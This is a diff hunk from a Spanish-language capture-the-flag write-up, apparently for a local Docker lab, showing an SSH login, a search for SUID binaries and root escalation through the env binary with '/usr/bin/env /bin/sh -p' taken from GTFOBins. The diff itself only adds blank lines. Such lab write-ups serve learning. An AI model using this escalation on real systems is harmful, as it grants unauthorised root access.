@@ -51,12 +51,15 @@ ssh dylan@172.17.0.2
 ![Screenshot 2024-11-09 083940](https://github.com/user-attachments/assets/f7e7b3ae-bcad-4d29-a974-0061dd61f303)
 
 find / -perm -4000 2>/dev/null
+
 Encontramos el binario env
 
 ![Screenshot 2024-11-09 084245](https://github.com/user-attachments/assets/dcefe9d7-fc4a-4de7-bf93-2de3a2d23519)
 
 Vamos a explotarlo haciendo una búsqueda en GTFOBins
+
 /usr/bin/env /bin/sh -p
+
 whoami
 
 ![Screenshot 2024-11-09 084333](https://github.com/user-attachments/assets/1c8f5581-a48d-44c3-ab65-339d7d6972de)
